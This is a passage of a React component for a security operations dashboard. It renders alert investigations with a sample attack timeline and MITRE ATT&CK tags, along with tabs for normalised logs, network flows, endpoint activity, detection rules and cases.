                        <span className="text-xs font-mono text-primary uppercase">Investigation</span>
                      </div>
                      <Button 
                        size="sm" 
                        variant="ghost" 
                        className="h-6 px-2 text-[10px]"
                        onClick={() => onAlertSelect?.(selectedAlertId)}
                      >
                        Close
                      </Button>
                    </div>
                    <ScrollArea className="flex-1 p-3">
                      <div className="space-y-4">
                        {/* Alert Header */}
                        <div className="flex items-start gap-3">
                          <div className={clsx("p-2 rounded", config.color)}>
                            <Icon className="w-5 h-5" />
                          </div>
                          <div>
                            <h3 className="text-sm font-bold text-white">{selectedAlert.title}</h3>
                            <p className="text-[11px] text-muted-foreground mt-1">{selectedAlert.description}</p>
                          </div>
                        </div>

                        {/* Alert Details */}
                        <div className="bg-black/30 rounded-lg p-3 border border-white/5">
                          <h4 className="text-[10px] font-mono text-primary mb-2 uppercase">Alert Details</h4>
                          <div className="grid grid-cols-2 gap-2 text-[10px]">
                            <div>
                              <span className="text-muted-foreground">ID:</span>
                              <span className="text-white ml-2 font-mono">{selectedAlert.id}</span>
                            </div>
                            <div>
                              <span className="text-muted-foreground">Severity:</span>
                              <Badge className={clsx("ml-2 text-[8px]", config.color)}>{selectedAlert.severity.toUpperCase()}</Badge>
                            </div>
                            <div>
                              <span className="text-muted-foreground">Source:</span>
                              <span className="text-cyan-400 ml-2">{selectedAlert.source}</span>
                            </div>
                            <div>
                              <span className="text-muted-foreground">Status:</span>
                              <Badge className={clsx("ml-2 text-[8px]", statusConfig[selectedAlert.status].color)}>{selectedAlert.status}</Badge>
                            </div>
                            {selectedAlert.sourceIp && (
                              <div>
                                <span className="text-muted-foreground">Source IP:</span>
                                <span className="text-orange-400 ml-2 font-mono">{selectedAlert.sourceIp}</span>
                              </div>
                            )}
                            {selectedAlert.destIp && (
                              <div>
                                <span className="text-muted-foreground">Dest IP:</span>
                                <span className="text-blue-400 ml-2 font-mono">{selectedAlert.destIp}</span>
                              </div>
                            )}
                          </div>
                        </div>

                        {/* MITRE ATT&CK */}
                        {selectedAlert.mitreId && (
                          <div className="bg-cyan-500/10 rounded-lg p-3 border border-cyan-500/20">
                            <h4 className="text-[10px] font-mono text-cyan-400 mb-2 uppercase flex items-center gap-1">
                              <Shield className="w-3 h-3" /> MITRE ATT&CK
                            </h4>
                            <div className="text-[10px]">
                              <div className="flex items-center gap-2 mb-1">
                                <span className="text-muted-foreground">Technique:</span>
                                <Badge variant="outline" className="text-cyan-400 border-cyan-400/30">{selectedAlert.mitreId}</Badge>
                              </div>
                              <div>
                                <span className="text-muted-foreground">Tactic:</span>
                                <span className="text-white ml-2">{selectedAlert.mitreTactic}</span>
                              </div>
                            </div>
                          </div>
                        )}

                        {/* Incident Timeline */}
                        <div className="bg-black/30 rounded-lg p-3 border border-white/5">
                          <h4 className="text-[10px] font-mono text-cyan-400 mb-3 uppercase flex items-center gap-1">
                            <Clock className="w-3 h-3" /> Attack Timeline
                          </h4>
                          <div className="relative pl-4 space-y-3 before:absolute before:left-[7px] before:top-2 before:bottom-2 before:w-[2px] before:bg-gradient-to-b before:from-red-500 before:via-yellow-500 before:to-green-500">
                            {[
                              { time: "03:42:15", event: "Initial Access", type: "attack", mitre: "T1078.004", desc: "Credential used from anomalous location" },
                              { time: "03:43:22", event: "Reconnaissance", type: "attack", mitre: "T1087", desc: "IAM user enumeration detected" },
                              { time: "03:45:01", event: "Alert Generated", type: "detection", desc: "GuardDuty flagged anomalous API calls" },
                              { time: "03:47:33", event: "Privilege Escalation Attempt", type: "attack", mitre: "T1098", desc: "Policy modification attempted" },
                              { time: "NOW", event: "Awaiting Response", type: "pending", desc: "Analyst investigation required" }
                            ].map((item, idx) => (
                              <div key={idx} className="relative flex items-start gap-2">
                                <div className={clsx(
                                  "w-3 h-3 rounded-full border-2 mt-0.5 flex-shrink-0",
                                  item.type === "attack" ? "bg-red-500/50 border-red-500" :
                                  item.type === "detection" ? "bg-yellow-500/50 border-yellow-500" :
                                  item.type === "remediation" ? "bg-green-500/50 border-green-500" :
                                  "bg-blue-500/50 border-blue-500 animate-pulse"
                                )} />
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-2 flex-wrap">
                                    <span className="text-[9px] font-mono text-muted-foreground">{item.time}</span>
                                    <span className="text-[10px] font-semibold text-white">{item.event}</span>
                                    {item.mitre && (
                                      <Badge variant="outline" className="text-[7px] px-1 py-0 text-cyan-400 border-cyan-400/30">{item.mitre}</Badge>
                                    )}
                                  </div>
                                  <p className="text-[9px] text-muted-foreground truncate">{item.desc}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>

                        {/* Correlated Evidence */}
                        <div className="bg-purple-500/5 rounded-lg p-3 border border-purple-500/20">
                          <h4 className="text-[10px] font-mono text-purple-400 mb-2 uppercase flex items-center gap-1">
                            <Activity className="w-3 h-3" /> Correlated Evidence
                          </h4>
                          <div className="space-y-2 text-[9px]">
                            <div className="flex items-center gap-2 bg-black/30 rounded p-2">
                              <Badge className="bg-blue-500/20 text-blue-300 text-[7px]">CloudTrail</Badge>
                              <span className="text-white">4 related API calls from same source IP</span>
                            </div>
                            <div className="flex items-center gap-2 bg-black/30 rounded p-2">
                              <Badge className="bg-green-500/20 text-green-300 text-[7px]">VPC Flow</Badge>
                              <span className="text-white">Outbound connection to known C2 IP</span>
                            </div>
                            <div className="flex items-center gap-2 bg-black/30 rounded p-2">
                              <Badge className="bg-orange-500/20 text-orange-300 text-[7px]">GuardDuty</Badge>
                              <span className="text-white">UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</span>
                            </div>
                          </div>
                        </div>

                        {/* Investigation Commands */}
                        <div className="bg-blue-500/5 rounded-lg p-3 border border-blue-500/20">
                          <h4 className="text-[10px] font-mono text-blue-400 mb-2 uppercase flex items-center gap-1">
                            <Search className="w-3 h-3" /> Investigation Commands
                          </h4>
                          <p className="text-[10px] text-muted-foreground mb-2">
                            Run these commands in the terminal to investigate:
                          </p>
                          <div className="space-y-1 font-mono text-[10px]">
                            {getInvestigationCommands(selectedAlert).map((cmd, idx) => (
                              <div key={idx} className="bg-black/50 rounded px-2 py-1 text-blue-300">{cmd}</div>
                            ))}
                          </div>
                        </div>

                        {/* Remediation Commands */}
                        <div className="bg-primary/5 rounded-lg p-3 border border-primary/20">
                          <h4 className="text-[10px] font-mono text-primary mb-2 uppercase flex items-center gap-1">
                            <Terminal className="w-3 h-3" /> Remediation Commands
                          </h4>
                          <p className="text-[10px] text-muted-foreground mb-2">
                            After investigation, run these to remediate:
                          </p>
                          <div className="space-y-1 font-mono text-[10px]">
                            {getRemediationCommands(selectedAlert).map((cmd, idx) => (
                              <div key={idx} className="bg-black/50 rounded px-2 py-1 text-primary">{cmd}</div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </ScrollArea>
                  </motion.div>
                );
              })()}
            </AnimatePresence>
          </div>
        </TabsContent>

        <TabsContent value="logs" className="absolute inset-0 m-0 overflow-hidden flex flex-col data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          {/* Log Source Filter */}
          <div className="flex items-center gap-2 px-3 py-2 border-b border-white/5 flex-shrink-0">
            <Filter className="w-3 h-3 text-muted-foreground" />
            <div className="flex gap-1 flex-wrap">
              {["all", "windows", "linux", "cloud", "network"].map(src => (
                <button
                  key={src}
                  onClick={() => setLogSourceFilter(src)}
                  className={clsx(
                    "px-2 py-0.5 text-[9px] font-mono rounded uppercase transition-all",
                    logSourceFilter === src 
                      ? "bg-primary/20 text-primary border border-primary/40" 
                      : "text-muted-foreground hover:text-white"
                  )}
                  data-testid={`log-filter-${src}`}
                >
                  {src}
                </button>
              ))}
            </div>
          </div>
          <ScrollArea className="flex-1">
            <div className="p-2 font-mono text-[10px] space-y-2">
              {filteredLogs.map((log, idx) => {
                const sourceTypeIcons: Record<string, string> = {
                  windows: "WIN",
                  linux: "LNX", 
                  cloud: "CLD",
                  network: "NET",
                  endpoint: "EDR"
                };
                return (
                  <motion.div
                    key={idx}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: idx * 0.02 }}
                    className={clsx(
                      "p-3 rounded-lg border",
                      log.level === "error" ? "bg-red-500/5 border-red-500/15" :
                      log.level === "warn" ? "bg-yellow-500/5 border-yellow-500/15" :
                      log.level === "info" ? "bg-blue-500/5 border-blue-500/15" :
                      "bg-slate-500/5 border-slate-500/15"
                    )}
                    data-testid={`log-${idx}`}
                  >
                    {/* Log Header */}
                    <div className="flex items-center gap-2 mb-2 flex-wrap">
                      <span className="text-muted-foreground">{formatTime(log.timestamp)}</span>
                      <Badge variant="outline" className="text-[8px] px-1.5 py-0">
                        {sourceTypeIcons[log.sourceType] || "LOG"}
                      </Badge>
                      <Badge variant="outline" className={clsx(
                        "text-[8px] px-1 py-0 uppercase",
                        log.level === "error" ? "text-red-300/70 border-red-400/20" :
                        log.level === "warn" ? "text-yellow-300/70 border-yellow-400/20" :
                        log.level === "info" ? "text-blue-300/70 border-blue-400/20" :
                        "text-slate-300/70 border-slate-400/20"
                      )}>
                        {log.level}
                      </Badge>
                      {log.eventId && (
                        <Badge variant="outline" className="text-[8px] px-1 py-0 text-cyan-300/60 border-cyan-400/20">
                          {log.eventId}
                        </Badge>
                      )}
                      <span className="text-primary">[{log.source}]</span>
                    </div>
                    
                    {/* Message */}
                    <p className="text-white/90 mb-2">{log.message}</p>
                    
                    {/* Normalized Fields */}
                    <div className="bg-black/30 rounded p-2 mb-2 space-y-1">
                      <div className="text-[9px] text-primary uppercase mb-1">Normalized Fields</div>
                      <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[9px]">
                        <div><span className="text-muted-foreground">Type:</span> <span className="text-white">{log.normalized.eventType}</span></div>
                        {log.normalized.user && <div><span className="text-muted-foreground">User:</span> <span className="text-purple-400">{log.normalized.user}</span></div>}
                        {log.normalized.host && <div><span className="text-muted-foreground">Host:</span> <span className="text-cyan-400">{log.normalized.host}</span></div>}
                        {log.normalized.ip && <div><span className="text-muted-foreground">IP:</span> <span className="text-orange-400">{log.normalized.ip}</span></div>}
                        {log.normalized.process && <div><span className="text-muted-foreground">Process:</span> <span className="text-yellow-400">{log.normalized.process}</span></div>}
                        {log.normalized.action && <div><span className="text-muted-foreground">Action:</span> <span className={log.normalized.action === "failure" || log.normalized.action === "denied" ? "text-red-400" : "text-green-400"}>{log.normalized.action}</span></div>}
                      </div>
                    </div>
                    
                    {/* Enrichment Data */}
                    {log.enrichment && (
                      <div className="bg-cyan-500/5 rounded p-2 mb-2 border border-cyan-500/20">
                        <div className="text-[9px] text-cyan-400 uppercase mb-1 flex items-center gap-1">
                          <Zap className="w-2.5 h-2.5" /> Enrichment
                        </div>
                        <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[9px]">
                          {log.enrichment.geoip && (
                            <div className="flex items-center gap-1">
                              <MapPin className="w-2.5 h-2.5 text-muted-foreground" />
                              <span className="text-white">{log.enrichment.geoip.city}, {log.enrichment.geoip.country}</span>
                              <span className="text-muted-foreground">({log.enrichment.geoip.isp})</span>
                            </div>
                          )}
                          {log.enrichment.userContext && (
                            <div className="flex items-center gap-1">
                              <Building className="w-2.5 h-2.5 text-muted-foreground" />
                              <span className="text-white">{log.enrichment.userContext.department}</span>
                              <span className="text-muted-foreground">({log.enrichment.userContext.role})</span>
                              <Badge className={clsx(
                                "text-[7px] px-1 py-0",
                                log.enrichment.userContext.riskScore > 75 ? "bg-red-500/10 text-red-300/70" :
                                log.enrichment.userContext.riskScore > 50 ? "bg-yellow-500/10 text-yellow-300/70" :
                                "bg-green-500/10 text-green-300/70"
                              )}>
                                Risk: {log.enrichment.userContext.riskScore}
                              </Badge>
                            </div>
                          )}
                          {log.enrichment.assetCriticality && (
                            <div className="flex items-center gap-1">
                              <Server className="w-2.5 h-2.5 text-muted-foreground" />
                              <span className="text-muted-foreground">Asset:</span>
                              <Badge className={clsx(
                                "text-[7px] px-1 py-0",
                                log.enrichment.assetCriticality === "critical" ? "bg-red-500/10 text-red-300/70" :
                                log.enrichment.assetCriticality === "high" ? "bg-orange-500/10 text-orange-300/70" :
                                log.enrichment.assetCriticality === "medium" ? "bg-yellow-500/10 text-yellow-300/70" :
                                "bg-green-500/10 text-green-300/70"
                              )}>
                                {log.enrichment.assetCriticality.toUpperCase()}
                              </Badge>
                            </div>
                          )}
                          {log.enrichment.reputation && (
                            <div className="flex items-center gap-1">
                              <Shield className="w-2.5 h-2.5 text-muted-foreground" />
                              <span className="text-muted-foreground">Reputation:</span>
                              <Badge className={clsx(
                                "text-[7px] px-1 py-0",
                                log.enrichment.reputation === "malicious" ? "bg-red-500/10 text-red-300/70" :
                                log.enrichment.reputation === "suspicious" ? "bg-yellow-500/10 text-yellow-300/70" :
                                log.enrichment.reputation === "clean" ? "bg-green-500/10 text-green-300/70" :
                                "bg-slate-500/10 text-slate-300/70"
                              )}>
                                {log.enrichment.reputation.toUpperCase()}
                              </Badge>
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                    
                    {/* Raw Details */}
                    {log.details && (
                      <div className="text-[9px] text-muted-foreground">
                        {Object.entries(log.details).map(([k, v]) => (
                          <span key={k} className="mr-3">{k}=<span className="text-cyan-400">{v}</span></span>
                        ))}
                      </div>
                    )}
                  </motion.div>
                );
              })}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="network" className="absolute inset-0 m-0 overflow-hidden data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          <ScrollArea className="h-full">
            <div className="p-2">
              <table className="w-full text-[10px] font-mono">
                <thead>
                  <tr className="text-muted-foreground border-b border-white/10">
                    <th className="text-left py-2 px-2">TIME</th>
                    <th className="text-left py-2 px-2">DIR</th>
                    <th className="text-left py-2 px-2">SRC IP</th>
                    <th className="text-left py-2 px-2">DEST IP</th>
                    <th className="text-left py-2 px-2">PORT</th>
                    <th className="text-left py-2 px-2">PROTO</th>
                    <th className="text-left py-2 px-2">ACTION</th>
                    <th className="text-right py-2 px-2">BYTES</th>
                  </tr>
                </thead>
                <tbody>
                  {networkEvents.map((event, idx) => (
                    <motion.tr
                      key={idx}
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      transition={{ delay: idx * 0.03 }}
                      className={clsx(
                        "border-b border-white/5",
                        event.action === "deny" ? "bg-red-500/5" :
                        event.action === "alert" ? "bg-yellow-500/5" : ""
                      )}
                      data-testid={`network-${idx}`}
                    >
                      <td className="py-2 px-2 text-muted-foreground">{formatTime(event.timestamp)}</td>
                      <td className="py-2 px-2">
                        <Badge variant="outline" className={clsx(
                          "text-[7px] px-1 py-0",
                          event.direction === "inbound" ? "text-orange-300/60 border-orange-400/20" :
                          event.direction === "outbound" ? "text-blue-300/60 border-blue-400/20" :
                          "text-slate-300/60 border-slate-400/20"
                        )}>
                          {event.direction === "inbound" ? "IN" : event.direction === "outbound" ? "OUT" : "INT"}
                        </Badge>
                      </td>
                      <td className="py-2 px-2">
                        <span className="text-cyan-400">{event.srcIp}</span>
                        {event.enrichment?.srcGeo && (
                          <span className="text-[8px] text-muted-foreground ml-1">({event.enrichment.srcGeo.country})</span>
                        )}
                      </td>
                      <td className="py-2 px-2">
                        <span className="text-purple-400">{event.destIp}</span>
                        {event.enrichment?.destGeo && (
                          <span className="text-[8px] text-muted-foreground ml-1">({event.enrichment.destGeo.country})</span>
                        )}
                      </td>
                      <td className="py-2 px-2 text-white">{event.srcPort}:{event.destPort}</td>
                      <td className="py-2 px-2 text-muted-foreground">{event.protocol}</td>
                      <td className="py-2 px-2">
                        <Badge className={clsx(
                          "text-[8px] px-1.5 py-0",
                          event.action === "allow" ? "bg-green-500/10 text-green-300/70" :
                          event.action === "deny" ? "bg-red-500/10 text-red-300/70" :
                          "bg-yellow-500/10 text-yellow-300/70"
                        )}>
                          {event.action.toUpperCase()}
                        </Badge>
                      </td>
                      <td className="py-2 px-2 text-right text-muted-foreground">
                        {event.bytes > 1000000 ? `${(event.bytes / 1000000).toFixed(1)}MB` :
                         event.bytes > 1000 ? `${(event.bytes / 1000).toFixed(1)}KB` : 
                         `${event.bytes}B`}
                      </td>
                    </motion.tr>
                  ))}
                </tbody>
              </table>
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="endpoints" className="absolute inset-0 m-0 overflow-hidden data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          <ScrollArea className="h-full">
            <div className="p-2 space-y-2">
              {endpointActivity.map((activity, idx) => (
                <motion.div
                  key={idx}
                  initial={{ opacity: 0, y: 5 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: idx * 0.03 }}
                  className={clsx(
                    "p-3 rounded-lg border",
                    activity.status === "malicious" ? "bg-red-500/5 border-red-500/15" :
                    activity.status === "suspicious" ? "bg-yellow-500/5 border-yellow-500/15" :
                    "bg-black/30 border-white/10"
                  )}
                  data-testid={`endpoint-${idx}`}
                >
                  <div className="flex items-center justify-between mb-2 gap-2">
                    <div className="flex items-center gap-2">
                      <Monitor className={clsx(
                        "w-4 h-4",
                        activity.status === "malicious" ? "text-red-300/70" :
                        activity.status === "suspicious" ? "text-yellow-300/70" :
                        "text-primary/70"
                      )} />
                      <span className="text-xs font-bold text-white">{activity.hostname}</span>
                      <Badge variant="outline" className="text-[8px]">{activity.eventId}</Badge>
                    </div>
                    <div className="flex items-center gap-1">
                      {activity.mitreTechnique && (
                        <Badge variant="outline" className="text-[8px] text-cyan-300/60 border-cyan-400/20">
                          {activity.mitreTechnique}
                        </Badge>
                      )}
                      <Badge className={clsx(
                        "text-[8px]",
                        activity.status === "malicious" ? "bg-red-500/10 text-red-300/70" :
                        activity.status === "suspicious" ? "bg-yellow-500/10 text-yellow-300/70" :
                        "bg-green-500/10 text-green-300/70"
                      )}>
                        {activity.status.toUpperCase()}
                      </Badge>
                    </div>
                  </div>
                  <div className="text-[10px] font-mono space-y-1">
                    <div className="flex items-center gap-2">
                      <span className="text-muted-foreground">Event:</span>
                      <span className="text-white">{activity.eventType}</span>
                    </div>
                    {activity.process && (
                      <div className="flex items-center gap-2">
                        <span className="text-muted-foreground">Process:</span>
                        <span className={clsx(
                          activity.status === "malicious" ? "text-red-300/70" : "text-cyan-300/70"
                        )}>{activity.process}</span>
                        {activity.parentProcess && (
                          <span className="text-muted-foreground">(parent: {activity.parentProcess})</span>
                        )}
                      </div>
                    )}
                    {activity.commandLine && (
                      <div className="flex items-start gap-2">
                        <span className="text-muted-foreground">Cmd:</span>
                        <span className="text-orange-300/70 break-all">{activity.commandLine}</span>
                      </div>
                    )}
                    {activity.user && (
                      <div className="flex items-center gap-2">
                        <span className="text-muted-foreground">User:</span>
                        <span className="text-purple-300/70">{activity.user}</span>
                      </div>
                    )}
                    <div className="flex items-center gap-2">
                      <span className="text-muted-foreground">Time:</span>
                      <span className="text-muted-foreground">{formatTimeAgo(activity.timestamp)}</span>
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        {/* Detection Rules Tab */}
        <TabsContent value="detections" className="absolute inset-0 m-0 overflow-hidden data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          <ScrollArea className="h-full">
            <div className="p-2 space-y-2">
              {detectionRules.map((rule, idx) => {
                const config = severityConfig[rule.severity];
                return (
                  <motion.div
                    key={rule.id}
                    initial={{ opacity: 0, y: 5 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: idx * 0.03 }}
                    className="p-3 rounded-lg border bg-black/30 border-white/10"
                    data-testid={`detection-${rule.id}`}
                  >
                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
                      <div className="flex items-center gap-2 flex-wrap">
                        <Code className="w-4 h-4 text-primary" />
                        <span className="text-xs font-bold text-white">{rule.name}</span>
                        <Badge className={clsx("text-[8px]", config.color)}>
                          {rule.severity.toUpperCase()}
                        </Badge>
                        {rule.mitreId && (
                          <Badge variant="outline" className="text-[8px] text-cyan-300/60 border-cyan-400/20">
                            {rule.mitreId}
                          </Badge>
                        )}
                      </div>
                      <div className="flex items-center gap-2">
                        {rule.enabled ? (
                          <ToggleRight className="w-4 h-4 text-green-300/60" />
                        ) : (
                          <ToggleLeft className="w-4 h-4 text-muted-foreground" />
                        )}
                        <Badge variant="outline" className="text-[8px]">
                          {rule.triggerCount} triggers
                        </Badge>
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground mb-2">{rule.description}</p>
                    <div className="bg-black/50 rounded p-2 mb-2">
                      <code className="text-[9px] text-primary font-mono break-all">{rule.logic}</code>
                    </div>
                    <div className="flex items-center gap-4 text-[9px] text-muted-foreground flex-wrap">
                      {rule.mitreTactic && (
                        <span className="flex items-center gap-1">
                          <Shield className="w-2.5 h-2.5" /> {rule.mitreTactic}
                        </span>
                      )}
                      {rule.threshold && (
                        <span className="flex items-center gap-1">
                          Threshold: {rule.threshold.count} in {rule.threshold.timeWindow}
                        </span>
                      )}
                      {rule.lastTriggered && (
                        <span className="flex items-center gap-1">
                          <Clock className="w-2.5 h-2.5" /> Last: {formatTimeAgo(rule.lastTriggered)}
                        </span>
                      )}
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </ScrollArea>
        </TabsContent>

        {/* Cases Tab */}
        <TabsContent value="cases" className="absolute inset-0 m-0 overflow-hidden data-[state=inactive]:pointer-events-none data-[state=inactive]:hidden">
          <ScrollArea className="h-full">
            <div className="p-2 space-y-2">
              {cases.map((caseItem, idx) => {
                const priorityConfig = severityConfig[caseItem.priority];
                const caseStatusConfig: Record<string, { color: string; label: string }> = {
                  open: { color: "bg-red-500/30 text-red-300", label: "OPEN" },
                  investigating: { color: "bg-yellow-500/30 text-yellow-300", label: "INVESTIGATING" },
                  pending: { color: "bg-blue-500/30 text-blue-300", label: "PENDING" },
                  closed: { color: "bg-green-500/30 text-green-300", label: "CLOSED" }
                };
                return (
                  <motion.div
                    key={caseItem.id}
                    initial={{ opacity: 0, y: 5 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: idx * 0.03 }}
                    className="p-3 rounded-lg border bg-black/30 border-white/10"
                    data-testid={`case-${caseItem.id}`}
                  >
                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
                      <div className="flex items-center gap-2 flex-wrap">
                        <Briefcase className="w-4 h-4 text-primary" />
                        <span className="text-[10px] font-mono text-muted-foreground">{caseItem.id}</span>
                        <span className="text-xs font-bold text-white">{caseItem.title}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Badge className={clsx("text-[8px]", priorityConfig.color)}>
                          P:{caseItem.priority.toUpperCase()}
                        </Badge>
                        <Badge className={clsx("text-[8px]", caseStatusConfig[caseItem.status].color)}>
                          {caseStatusConfig[caseItem.status].label}
                        </Badge>
                      </div>
                    </div>
                    <div className="text-[10px] space-y-2">
                      <div className="flex items-center gap-4 text-muted-foreground flex-wrap">
                        {caseItem.assignee && (
                          <span className="flex items-center gap-1">
                            <User className="w-2.5 h-2.5" /> {caseItem.assignee}
                          </span>
                        )}
                        <span className="flex items-center gap-1">
                          <Clock className="w-2.5 h-2.5" /> Created: {formatTimeAgo(caseItem.createdAt)}
                        </span>
                        <span className="flex items-center gap-1">
                          <AlertTriangle className="w-2.5 h-2.5" /> {caseItem.alertIds.length} alert(s)
                        </span>
                      </div>
                      {caseItem.notes.length > 0 && (
                        <div className="bg-black/40 rounded p-2 space-y-1">
                          <span className="text-[9px] text-primary uppercase">Notes:</span>
                          {caseItem.notes.slice(-2).map((note, i) => (
                            <div key={i} className="text-[9px] text-muted-foreground">- {note}</div>
                          ))}
                        </div>
                      )}
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </ScrollArea>
        </TabsContent>
        </div>
      </Tabs>
    </div>
  );
}
